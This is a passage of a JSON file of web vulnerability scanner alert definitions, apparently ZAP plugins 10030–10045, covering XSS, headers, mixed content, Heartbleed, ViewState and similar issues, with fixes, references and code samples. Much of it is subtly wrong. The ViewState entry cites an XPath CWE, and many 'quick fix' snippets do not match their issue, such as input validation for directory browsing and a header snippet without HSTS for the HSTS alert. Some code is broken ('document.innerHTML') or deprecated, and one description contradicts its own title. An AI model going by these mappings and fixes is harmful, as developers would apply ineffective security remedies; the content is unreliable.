        "name": "CWE-565: Reliance on Cookies without Validation and Integrity Checking",
        "url": "https://cwe.mitre.org/data/definitions/565.html"
      },
      {
        "name": "OWASP Top Ten A05:2021 - Security Misconfiguration",
        "url": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10030,
    "title": "User Controllable Charset",
    "defaultRisk": "Medium",
    "cweid": 172,
    "description": "User controllable charset vulnerabilities occur when applications allow users to control character encoding settings, potentially enabling attackers to manipulate data interpretation, bypass security controls, or inject malicious content through encoding attacks.",
    "simplified_description": "Your application allows users to control how text is encoded and decoded, like letting someone change the language dictionary while you're reading a secret message. Attackers can manipulate the encoding to hide malicious code, bypass security filters, or change how sensitive data is interpreted by your application.",
    "solution": "Implement strict charset validation, use fixed character encoding throughout the application, and reject user input that attempts to control or influence character encoding settings.",
    "simplified_solution": "Lock your application to use consistent character encoding (UTF-8) everywhere and never let users control encoding settings. Validate all character encoding parameters, reject suspicious encoding requests, and implement strict input sanitization for any encoding-related parameters. Configure web servers and databases to use consistent character sets.",
    "references": [
      {
        "name": "OWASP Character Encoding Security",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/Character_Encoding_Cheat_Sheet.html"
      },
      {
        "name": "CWE-172: Encoding Error",
        "url": "https://cwe.mitre.org/data/definitions/172.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10031,
    "title": "User Controllable HTML Element Attribute (Potential XSS)",
    "defaultRisk": "High",
    "cweid": "CWE-79",
    "description": "User Controllable HTML Element Attribute vulnerabilities allow attackers to inject malicious JavaScript into HTML element attributes, potentially leading to Cross-Site Scripting (XSS) attacks. This occurs when applications reflect user input directly into HTML attributes without proper validation or encoding, enabling attackers to execute arbitrary JavaScript in victims' browsers, steal session cookies, redirect users to malicious sites, or perform unauthorized actions on behalf of users.",
    "simplified_description": "Your application has a security flaw that allows attackers to inject malicious JavaScript into HTML attributes. This is like allowing someone to write their own instructions on forms that other users will see and execute automatically - attackers can steal user session information, redirect users to fake websites, capture login credentials, and perform actions as if they were the legitimate user, potentially compromising user accounts and sensitive data.",
    "solution": "Implement proper output encoding for all HTML attributes, validate user input against allow-lists where possible, use secure templating engines that auto-escape, implement Content Security Policy (CSP) headers, sanitize user input using established libraries, and employ input validation to reject dangerous characters and patterns.",
    "simplified_solution": "Immediately fix all places where user input is placed in HTML attributes by using proper output encoding (like htmlspecialchars in PHP or attribute encoding in JavaScript). Validate all user input against strict allow-lists where possible. Use modern templating frameworks that automatically escape content. Implement Content Security Policy headers to prevent inline script execution. Sanitize user input using established security libraries before displaying it.",
    "references": [
      {
        "name": "OWASP XSS Prevention Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "CWE-79: Improper Neutralization of Input During Web Page Generation",
        "url": "https://cwe.mitre.org/data/definitions/79.html"
      },
      {
        "name": "OWASP Top Ten A03:2021 - Injection",
        "url": "https://owasp.org/Top10/A03_2021-Injection/"
      },
      {
        "name": "Content Security Policy Level 3",
        "url": "https://www.w3.org/TR/CSP3/"
      },
      {
        "name": "MITRE ATT&CK Technique T1059.007 - JavaScript",
        "url": "https://attack.mitre.org/techniques/T1059/007/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Sanitize all user input before rendering in HTML",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst userInput = req.query.param;\ndocument.innerHTML = userInput;\n\n// SECURE:\nconst userInput = validator.escape(req.query.param);\ndocument.textContent = userInput;"
      }
    ]
  },
  {
    "pluginId": 10032,
    "title": "Viewstate",
    "defaultRisk": "Medium",
    "cweid": 643,
    "description": "ViewState vulnerabilities occur when ASP.NET applications use insecure ViewState configurations, potentially exposing sensitive application state data, allowing tampering, or enabling attacks that can manipulate application behavior or access restricted functionality.",
    "simplified_description": "Your application is storing sensitive information in a format that can be easily read or modified by users, like writing your secret diary in invisible ink that anyone can reveal with the right chemicals. Attackers can decode your ViewState to see internal application data, modify it to change application behavior, or inject malicious content.",
    "solution": "Implement ViewState MAC verification, encrypt ViewState contents, disable ViewState for non-essential data, and use alternative session state management for sensitive information.",
    "simplified_solution": "Enable ViewState encryption and message authentication (MAC) in your ASP.NET configuration, disable ViewState for pages that don't need it, and never store sensitive data in ViewState. Use server-side session storage or encrypted database storage for sensitive information instead of client-side ViewState. Implement regular key rotation for ViewState encryption keys.",
    "references": [
      {
        "name": "Microsoft ViewState Security Guide",
        "url": "https://docs.microsoft.com/en-us/previous-versions/dotnet/framework/aspnet/75x4ha6s(v=vs.100)"
      },
      {
        "name": "CWE-643: Improper Neutralization of Data within XPath Expressions",
        "url": "https://cwe.mitre.org/data/definitions/643.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10033,
    "title": "Directory Browsing",
    "defaultRisk": "Medium",
    "cweid": "548",
    "description": "Directory browsing is enabled, allowing users to view a listing of files and directories when no default document (index.html, index.php, etc.) is present. This can expose sensitive files, reveal application structure, and provide attackers with valuable reconnaissance information.",
    "simplified_description": "Your website allows visitors to browse through your server's file directories, like letting strangers walk through your office building and read the names on all the doors and filing cabinets. Attackers can see what files exist, find sensitive information, and learn your application's structure.",
    "solution": "Disable directory browsing in web server configuration, ensure all directories have default index files, implement proper access controls, and use security headers to prevent information disclosure.",
    "simplified_solution": "Turn off directory browsing in your web server configuration, add index.html or index.php files to all directories, and set up proper access controls to prevent unauthorized directory access.",
    "references": [
      {
        "name": "OWASP Information Disclosure Prevention",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/Information_Leakage_Cheat_Sheet.html"
      },
      {
        "name": "CWE-548: Exposure of Information Through Directory Listing",
        "url": "https://cwe.mitre.org/data/definitions/548.html"
      },
      {
        "name": "Apache Directory Browsing Documentation",
        "url": "https://httpd.apache.org/docs/2.4/mod/core.html#options"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10034,
    "title": "Heartbleed OpenSSL Vulnerability (Indicative)",
    "defaultRisk": "High",
    "cweid": "200",
    "description": "Indicative detection of potential Heartbleed vulnerability based on OpenSSL version information or server responses. This suggests the system may be running a vulnerable version of OpenSSL (1.0.1 through 1.0.1f) that contains the Heartbleed bug (CVE-2014-0160).",
    "simplified_description": "Your system appears to be running a version of OpenSSL that may be vulnerable to the Heartbleed attack. This is like having a potential security weakness that could allow attackers to read sensitive information from your server's memory, including passwords, private keys, and other confidential data.",
    "solution": "Verify the actual OpenSSL version and update to a secure version (1.0.1g or later) if vulnerable. Revoke and reissue certificates if confirmed vulnerable.",
    "simplified_solution": "Check your OpenSSL version immediately and upgrade to version 1.0.1g or later if you're running 1.0.1 through 1.0.1f. Replace SSL certificates and force password changes if vulnerability is confirmed.",
    "references": [
      {
        "name": "OpenSSL Security Advisories",
        "url": "https://www.openssl.org/news/secadv/"
      },
      {
        "name": "CVE-2014-0160 Details",
        "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0160"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Redirect all HTTP traffic to HTTPS",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// FORCE HTTPS:\napp.use((req, res, next) => {\n  if (!req.secure) {\n    return res.redirect(301, 'https://' + req.headers.host + req.url);\n  }\n  next();\n});"
      }
    ]
  },
  {
    "pluginId": 10035,
    "title": "Strict-Transport-Security Header",
    "defaultRisk": "Medium",
    "cweid": 523,
    "description": "The HTTP Strict Transport Security (HSTS) header is not set, which means the application does not enforce HTTPS connections. This allows man-in-the-middle attacks where attackers can downgrade connections to HTTP and intercept, modify, or steal sensitive data.",
    "simplified_description": "Your website is missing a critical security header that forces browsers to use secure HTTPS connections. Without this protection, attackers can trick browsers into using unencrypted HTTP connections, allowing them to eavesdrop on communications, steal passwords and credit card numbers, or inject malicious content into your pages.",
    "solution": "Implement the HTTP Strict Transport Security (HSTS) header to enforce HTTPS connections for all communication. Configure appropriate max-age values and include subdomains as needed. Consider preload inclusion for maximum security.",
    "simplified_solution": "Add a security header to your web server configuration that tells browsers to always use HTTPS connections. This ensures all user data remains encrypted and protected from interception. Start with a short duration (like 1 week) and gradually increase to longer periods (6 months to 1 year) once you've verified everything works correctly.",
    "references": [
      {
        "name": "OWASP HSTS Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html"
      },
      {
        "name": "RFC 6797 - HTTP Strict Transport Security",
        "url": "https://tools.ietf.org/html/rfc6797"
      },
      {
        "name": "HSTS Preload List",
        "url": "https://hstspreload.org/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Set essential security headers",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ADD THESE HEADERS:\nres.set({\n  'X-Content-Type-Options': 'nosniff',\n  'X-Frame-Options': 'DENY',\n  'X-XSS-Protection': '1; mode=block'\n});"
      }
    ]
  },
  {
    "pluginId": 10036,
    "title": "HTTP Server Response Header",
    "defaultRisk": "Low",
    "cweid": 200,
    "description": "The web server is revealing its identity through HTTP response headers such as Server, X-Powered-By, and similar headers. This information disclosure provides attackers with valuable intelligence about the server software, version, and underlying technology stack, facilitating targeted attacks against known vulnerabilities.",
    "simplified_description": "Your website is announcing what server software it uses, like putting a sign on your house saying what kind of locks you have. Attackers use this information to search for specific vulnerabilities in your server software and launch targeted attacks against your known weaknesses.",
    "solution": "Remove or obscure server identification headers to prevent information disclosure. Configure web servers and application frameworks to suppress version information and technology identification. Implement proper header filtering at the web server, application, and reverse proxy levels.",
    "simplified_solution": "Hide your server software information by configuring your web server and application to remove identifying headers. This makes it harder for attackers to identify specific vulnerabilities in your technology stack. Update your server configuration files and application settings to suppress server signatures.",
    "references": [
      {
        "name": "OWASP Information Exposure Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Information_Exposure_Cheat_Sheet.html"
      },
      {
        "name": "NIST SP 800-53 Rev 4",
        "url": "https://csrc.nist.gov/publications/detail/sp/800-53/rev-4/final"
      },
      {
        "name": "CWE-200: Information Exposure",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Set essential security headers",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ADD THESE HEADERS:\nres.set({\n  'X-Content-Type-Options': 'nosniff',\n  'X-Frame-Options': 'DENY',\n  'X-XSS-Protection': '1; mode=block'\n});"
      }
    ]
  },
  {
    "pluginId": 10037,
    "title": "Server Leaks Information via \"X-Powered-By\" HTTP Response Header Field(s)",
    "defaultRisk": "Low",
    "cweid": 200,
    "description": "The application is disclosing technology stack information through the X-Powered-By header, revealing the underlying programming language, framework, or web server technology. This information exposure assists attackers in identifying specific vulnerabilities in the disclosed technologies and crafting targeted attacks.",
    "simplified_description": "Your website is telling attackers what programming language and frameworks it uses, like announcing on your front door what brand and model of security system you have. Attackers use this information to find specific vulnerabilities in your technology stack and launch targeted attacks.",
    "solution": "Remove the X-Powered-By header and other technology-identifying headers by configuring web servers, application servers, and programming language settings. This should be implemented at multiple levels including the language runtime, web server configuration, and application framework settings.",
    "simplified_solution": "Configure your web application to hide technology information by removing X-Powered-By headers. This involves settings in your programming language (PHP, ASP.NET, Node.js), web server (Apache, Nginx), and application framework. Test your application to ensure functionality isn't affected.",
    "references": [
      {
        "name": "OWASP Information Exposure Through an Error Message",
        "url": "https://owasp.org/www-project-top-ten/2017/A5_2017-Security_Misconfiguration"
      },
      {
        "name": "CWE-200: Information Exposure",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      },
      {
        "name": "SANS Top 25 Software Errors",
        "url": "https://www.sans.org/top25-software-errors/#cat1"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Set essential security headers",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ADD THESE HEADERS:\nres.set({\n  'X-Content-Type-Options': 'nosniff',\n  'X-Frame-Options': 'DENY',\n  'X-XSS-Protection': '1; mode=block'\n});"
      }
    ]
  },
  {
    "pluginId": 10038,
    "title": "Content Security Policy (CSP) Header Not Set",
    "defaultRisk": "Medium",
    "cweid": "693",
    "description": "The application is missing a Content Security Policy (CSP) header, which is a critical defense mechanism against various attacks including Cross-Site Scripting (XSS), data injection attacks, and clickjacking. Without CSP, browsers have no clear instructions about which resources are safe to load.",
    "simplified_description": "Your website is missing a critical security header that acts like a security guard for your content. Without it, attackers can inject malicious scripts, steal user data, and perform other attacks by tricking browsers into loading harmful content from unauthorized sources.",
    "solution": "Implement a comprehensive Content Security Policy that defines allowed sources for scripts, styles, images, and other resources. Start with a restrictive policy and gradually whitelist necessary resources.",
    "simplified_solution": "Add a Content-Security-Policy header that tells browsers which domains are allowed to provide content. Start with a strict policy and add specific rules for each type of content (scripts, styles, images, fonts, etc.).",
    "references": [
      {
        "name": "OWASP Content Security Policy Cheat Sheet",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"
      },
      {
        "name": "MDN CSP Documentation",
        "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Set essential security headers",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ADD THESE HEADERS:\nres.set({\n  'X-Content-Type-Options': 'nosniff',\n  'X-Frame-Options': 'DENY',\n  'X-XSS-Protection': '1; mode=block'\n});"
      }
    ]
  },
  {
    "pluginId": 10039,
    "title": "X-Backend-Server Header Information Leak",
    "defaultRisk": "Medium",
    "cweid": 200,
    "description": "X-Backend-Server header exposes internal server architecture and load balancer configuration information, revealing details about the backend infrastructure including server hostnames, IP addresses, software versions, load balancing algorithms, and internal network topology. This information assists attackers in understanding the target infrastructure, planning targeted attacks, and exploiting potential vulnerabilities in specific server configurations or load balancing implementations.",
    "simplified_description": "Your web server is revealing details about your internal infrastructure through HTTP headers, like posting your company's internal network map and server specifications on a public notice board. Attackers can use this information to understand your server architecture, identify potential weaknesses in specific components, and craft targeted attacks against your backend infrastructure.",
    "solution": "Remove X-Backend-Server headers from all responses and configure load balancers and reverse proxies to prevent internal infrastructure information disclosure.",
    "simplified_solution": "Immediately configure your web servers and load balancers to stop sending X-Backend-Server headers. Update your reverse proxy configuration to strip infrastructure headers, modify server software settings to disable verbose headers, and implement proper security headers to prevent information disclosure about your internal infrastructure.",
    "references": [
      {
        "name": "OWASP Information Leakage Prevention",
        "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/"
      },
      {
        "name": "CWE-200: Information Exposure",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      },
      {
        "name": "NIST SP 800-53 Rev. 5 - System and Information Integrity",
        "url": "https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Set essential security headers",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ADD THESE HEADERS:\nres.set({\n  'X-Content-Type-Options': 'nosniff',\n  'X-Frame-Options': 'DENY',\n  'X-XSS-Protection': '1; mode=block'\n});"
      }
    ]
  },
  {
    "pluginId": 10040,
    "title": "Secure Pages Include Mixed Content",
    "defaultRisk": "Medium",
    "cweid": 311,
    "description": "Mixed content vulnerabilities occur when HTTPS pages load HTTP resources, creating security gaps that allow man-in-the-middle attacks. When a secure HTTPS page includes HTTP resources (scripts, stylesheets, images, iframes, or other content), attackers can intercept and modify the insecure content, potentially injecting malicious code, stealing sensitive data, or compromising the entire security of the HTTPS connection. This undermines the trust established by SSL/TLS encryption and exposes users to various attacks including cross-site scripting (XSS), credential theft, and session hijacking.",
    "simplified_description": "Your secure HTTPS website is loading some resources (like images, scripts, or styles) from unsecured HTTP connections. This is like having a state-of-the-art security system for your building but leaving the back door unlocked. Attackers can exploit these unsecured connections to inject malicious code, steal user information, or take control of your supposedly secure pages, effectively bypassing all the security benefits of HTTPS.",
    "solution": "Ensure all resources loaded on HTTPS pages are served over HTTPS by updating all HTTP URLs to HTTPS, implementing Content Security Policy with upgrade-insecure-requests, and using protocol-relative or absolute HTTPS URLs throughout the application.",
    "simplified_solution": "Update every HTTP resource URL in your application to use HTTPS. This includes scripts, stylesheets, images, iframes, API calls, and third-party resources. Use protocol-relative URLs (//example.com) or absolute HTTPS URLs (https://example.com). Add a Content Security Policy header with 'upgrade-insecure-requests' to automatically upgrade HTTP requests to HTTPS. Test thoroughly to ensure all resources load securely and no mixed content warnings appear in browser DevTools.",
    "references": [
      {
        "name": "OWASP Mixed Content",
        "url": "https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"
      },
      {
        "name": "CWE-311: Missing Encryption of Sensitive Data",
        "url": "https://cwe.mitre.org/data/definitions/311.html"
      },
      {
        "name": "MDN Mixed Content Guide",
        "url": "https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content"
      },
      {
        "name": "Google Mixed Content Help",
        "url": "https://developers.google.com/web/fundamentals/security/prevent-mixed-content/what-is-mixed-content"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      },
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10041,
    "title": "HTTP to HTTPS Insecure Transition in Form Post",
    "defaultRisk": "High",
    "cweid": 319,
    "description": "HTTP to HTTPS insecure transition in form submissions occurs when forms on HTTPS pages submit data to HTTP endpoints, creating critical security vulnerabilities. When users submit sensitive information through forms that POST to HTTP URLs, the data is transmitted in plaintext without encryption, making it vulnerable to interception, modification, and theft by attackers. This vulnerability completely undermines the security provided by HTTPS on the page, as the sensitive data bypasses the secure channel and travels over an unencrypted connection, exposing credentials, personal information, payment details, and other confidential data to man-in-the-middle attacks.",
    "simplified_description": "Your secure HTTPS website has forms that send user data to unsecured HTTP addresses. This is like having a secure armored car deliver sensitive documents, but then having the courier hand them over to a regular postal service for the final delivery. Attackers can easily intercept and read all the information users submit through these forms, including passwords, credit card numbers, and personal details, completely bypassing your HTTPS security.",
    "solution": "Ensure all form submissions use HTTPS endpoints by updating form action URLs to HTTPS, implementing secure redirect mechanisms, adding HSTS headers, and using Content Security Policy to prevent insecure form submissions.",
    "simplified_solution": "Immediately update every form's action attribute to use HTTPS URLs instead of HTTP. Implement server-side redirects to force HTTPS for all form processing endpoints. Add HSTS headers to ensure browsers only connect via HTTPS. Use Content Security Policy with 'form-action https:' to prevent submissions to HTTP endpoints. Test all forms to verify they submit over secure connections and that sensitive data is never transmitted in plaintext.",
    "references": [
      {
        "name": "OWASP Insecure Transport",
        "url": "https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"
      },
      {
        "name": "CWE-319: Cleartext Transmission of Sensitive Information",
        "url": "https://cwe.mitre.org/data/definitions/319.html"
      },
      {
        "name": "OWASP Transport Layer Protection Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html"
      },
      {
        "name": "MDN Secure Forms Guide",
        "url": "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/form#security_considerations"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Redirect all HTTP traffic to HTTPS",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// FORCE HTTPS:\napp.use((req, res, next) => {\n  if (!req.secure) {\n    return res.redirect(301, 'https://' + req.headers.host + req.url);\n  }\n  next();\n});"
      },
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Redirect all HTTP traffic to HTTPS",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// FORCE HTTPS:\napp.use((req, res, next) => {\n  if (!req.secure) {\n    return res.redirect(301, 'https://' + req.headers.host + req.url);\n  }\n  next();\n});"
      }
    ]
  },
  {
    "pluginId": 10042,
    "title": "HTTPS to HTTP Insecure Transition in Form Post",
    "defaultRisk": "Medium",
    "cweid": 319,
    "description": "HTTPS to HTTP insecure transition occurs when secure forms on HTTPS pages submit data to insecure HTTP endpoints, causing sensitive user input to be transmitted unencrypted over the network. This vulnerability exposes user credentials, personal information, payment details, and other sensitive data to network eavesdropping, man-in-the-middle attacks, and data interception by malicious actors on the same network.",
    "simplified_description": "Your website has secure pages (HTTPS) with forms that send user data to insecure locations (HTTP), like having a secure lock on the front door but leaving the back door wide open. When users fill out forms with sensitive information, that data gets transmitted without encryption, allowing attackers on the same network to easily intercept and read everything they submit.",
    "solution": "Ensure all form submissions use HTTPS endpoints and implement proper security controls to prevent mixed content vulnerabilities. Configure web servers to enforce HTTPS-only communication and implement secure form handling practices.",
    "simplified_solution": "Immediately fix all forms to submit to HTTPS URLs instead of HTTP. Update your web server to enforce HTTPS for all form submissions, add HSTS headers to ensure browsers only use secure connections, and implement proper redirects from HTTP to HTTPS. Test all forms on your website to ensure they submit data securely and never over unencrypted connections.",
    "references": [
      {
        "name": "OWASP Mixed Content Prevention",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Mixed_Content_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "CWE-319: Cleartext Transmission of Sensitive Information",
        "url": "https://cwe.mitre.org/data/definitions/319.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Redirect all HTTP traffic to HTTPS",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// FORCE HTTPS:\napp.use((req, res, next) => {\n  if (!req.secure) {\n    return res.redirect(301, 'https://' + req.headers.host + req.url);\n  }\n  next();\n});"
      }
    ]
  },
  {
    "pluginId": 10043,
    "title": "User Controllable JavaScript Event (XSS)",
    "defaultRisk": "High",
    "cweid": "CWE-79",
    "description": "User Controllable JavaScript Event vulnerabilities allow attackers to inject malicious JavaScript code into HTML event handler attributes (onclick, onload, onerror, etc.), leading to Cross-Site Scripting (XSS) attacks. This occurs when applications reflect user input directly into JavaScript event handlers without proper validation or encoding, enabling attackers to execute arbitrary JavaScript code in victims' browsers when specific events are triggered.",
    "simplified_description": "Your application has a critical security flaw that allows attackers to inject malicious JavaScript code into HTML event handlers. This is like allowing attackers to write their own code that will automatically run when users interact with your website - they can steal user sessions, capture login credentials, redirect users to malicious sites, and perform actions on behalf of users, potentially compromising accounts and sensitive data.",
    "solution": "Never place user input directly into JavaScript event handlers, use proper output encoding for all dynamic content, implement Content Security Policy (CSP) headers, validate and sanitize all user input, use secure event handling patterns, avoid inline JavaScript event handlers, and employ modern frameworks with built-in XSS protection.",
    "simplified_solution": "Immediately remove all instances where user input is placed directly into event handlers like onclick, onload, onerror, etc. Use secure JavaScript event handling with addEventListener instead of inline event handlers. Implement Content Security Policy headers to block inline scripts. Validate and encode all user input using established security libraries. Use modern frameworks that automatically handle XSS protection.",
    "references": [
      {
        "name": "OWASP XSS Prevention Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "CWE-79: Improper Neutralization of Input During Web Page Generation",
        "url": "https://cwe.mitre.org/data/definitions/79.html"
      },
      {
        "name": "OWASP Top Ten A03:2021 - Injection",
        "url": "https://owasp.org/Top10/A03_2021-Injection/"
      },
      {
        "name": "Content Security Policy Level 3",
        "url": "https://www.w3.org/TR/CSP3/"
      },
      {
        "name": "MITRE ATT&CK Technique T1059.007 - JavaScript",
        "url": "https://attack.mitre.org/techniques/T1059/007/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Sanitize all user input before rendering in HTML",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst userInput = req.query.param;\ndocument.innerHTML = userInput;\n\n// SECURE:\nconst userInput = validator.escape(req.query.param);\ndocument.textContent = userInput;"
      }
    ]
  },
  {
    "pluginId": 10044,
    "title": "Big Redirect Detected (Potential Sensitive Information Leak)",
    "defaultRisk": "Medium",
    "cweid": 200,
    "description": "Big redirect vulnerabilities occur when applications implement URL redirection mechanisms without proper validation and security controls, potentially exposing sensitive information through redirect parameters, referer headers, or destination URLs. Attackers can exploit these vulnerabilities for phishing attacks, open redirect exploitation, or to gain access to internal resources and sensitive data.",
    "simplified_description": "Your website has URL redirects that aren't properly secured, like having unguarded doors that redirect visitors to unknown locations. Attackers can exploit these insecure redirects to send users to malicious websites, steal sensitive information through phishing attacks, or gain access to internal application areas that should be protected.",
    "solution": "Implement strict URL validation, maintain an allowlist of authorized redirect destinations, and use indirect reference maps for redirects. Implement proper CSRF protection and authentication checks for redirect functionality.",
    "simplified_solution": "Immediately secure your redirects by creating an allowlist of trusted destinations, validating all redirect URLs, and implementing indirect reference maps instead of direct URL parameters. Add CSRF protection and require authentication for sensitive redirects. Test all redirect functionality to ensure attackers cannot redirect users to malicious destinations.",
    "references": [
      {
        "name": "OWASP URL Redirect Abuse",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"
      },
      {
        "name": "CWE-601: URL Redirection to Untrusted Site",
        "url": "https://cwe.mitre.org/data/definitions/601.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10045,
    "title": "Source Code Disclosure - /WEB-INF Folder",
    "defaultRisk": "High",
    "cweid": "541",
    "description": "Source code disclosure through the /WEB-INF directory occurs when Java web applications incorrectly configure access controls, allowing attackers to directly access sensitive files including source code, configuration files, and compiled classes that should be protected.",
    "simplified_description": "Your web application has a security vulnerability that exposes sensitive source code and configuration files to attackers. This is like leaving the blueprints and master keys to your building publicly available - attackers can examine your application's inner workings, find security weaknesses, extract sensitive information like database credentials, and develop targeted attacks against your system.",
    "solution": "Properly configure web application security constraints and servlet mappings to prevent direct access to WEB-INF directory contents.",
    "simplified_solution": "Configure your web server and application to block all direct access to /WEB-INF/ and its subdirectories. Implement proper security constraints in web.xml, ensure servlet mappings don't expose sensitive paths, use URL rewriting to block WEB-INF access, and place all sensitive files under WEB-INF protection. Regularly test for directory traversal and access control bypass vulnerabilities.",
    "references": [
      {
        "name": "OWASP Source Code Disclosure",
        "url": "https://owasp.org/www-community/vulnerabilities/Source_code_disclosure"
      },
      {
        "name": "CWE-541: Information Exposure Through Source Code",
        "url": "https://cwe.mitre.org/data/definitions/541.html"
      },
      {
        "name": "Oracle Java EE Security Guide",
        "url": "https://docs.oracle.com/javaee/7/security-tutorial/security.htm"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
